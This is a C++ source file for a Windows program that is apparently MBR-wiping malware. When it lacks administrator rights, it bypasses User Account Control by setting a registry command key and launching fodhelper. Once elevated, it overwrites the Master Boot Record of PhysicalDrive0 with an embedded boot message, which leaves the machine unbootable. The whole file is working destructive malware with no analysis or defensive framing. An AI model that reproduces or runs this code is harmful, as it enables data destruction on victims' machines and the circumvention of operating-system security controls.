#include <Windows.h>
#include <mmsystem.h>
#include <Endpointvolume.h>
#include <iostream>
#include <cstring>
#include "mbr.hpp"

BOOL				isRunningAsAdmin(void)
{
  BOOL				isRunAsAdmin;
  PSID				pAdmin;
  SID_IDENTIFIER_AUTHORITY	idAuthority = SECURITY_NT_AUTHORITY;

  isRunAsAdmin = FALSE;
  if (!AllocateAndInitializeSid(&idAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
				DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
				&pAdmin))
    {
      FreeSid(pAdmin);
      return (isRunAsAdmin);
    }
  if (!CheckTokenMembership(NULL, pAdmin, &isRunAsAdmin))
    {
      FreeSid(pAdmin);
      return (isRunAsAdmin);
    }
  FreeSid(pAdmin);
  return (isRunAsAdmin);
}

int			create_reg_key(const char *name, const char *data)
{
  HKEY			key;

  RegCreateKeyEx(HKEY_CURRENT_USER, REG_PATH, 0, NULL, REG_OPTION_VOLATILE,
		 KEY_ALL_ACCESS, NULL, &key, NULL);
  RegSetValueEx(key, name, 0, REG_SZ, (BYTE*)data, std::strlen(data) + 1);
  RegCloseKey(key);
  return (0);
}

int			bypass_UAC(void)
{
  TCHAR			filename[MAX_PATH];
  std::string		cmd;

  if (GetModuleFileName(NULL, filename, MAX_PATH) == SUCCESS)
    return (FAILURE);
  cmd.append(CMD).append(" /c \"mode con: cols=15 lines=15 && ")
    .append(filename).append("\"");
  if (create_reg_key(DELEGATE_EXECUTE, "") == FAILURE)
    return (FAILURE);
  if (create_reg_key("", cmd.c_str()) == FAILURE)
    return (FAILURE);
  ShellExecute(NULL, "open", FODHELPER, NULL, NULL, 0);
  return (0);
}

void			crash_mbr(void)
{
  int			i;
  char			mbrData[MBR_SIZE];
  HANDLE		MasterBootRecord;

  i = 0;
  for (char *p = _binary_BootMessage_bin_start;
       p != _binary_BootMessage_bin_end;
       p++)
    {
      mbrData[i] = *p;
      i++;
    }
  MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL,
				FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
				OPEN_EXISTING, 0, NULL);
  WriteFile(MasterBootRecord, mbrData, MBR_SIZE, NULL, NULL);
  CloseHandle(MasterBootRecord);
}

int WINAPI		WinMain(HINSTANCE hInstance,
    				HINSTANCE hPrevInstance,
    				LPSTR lpCmdLine,
    				int nCmdShow)
{
  if (!isRunningAsAdmin())
    {
      if (bypass_UAC() == FAILURE)
	return (FAILURE);
      return (0);
    }
  else
    crash_mbr();
  return (0);
}
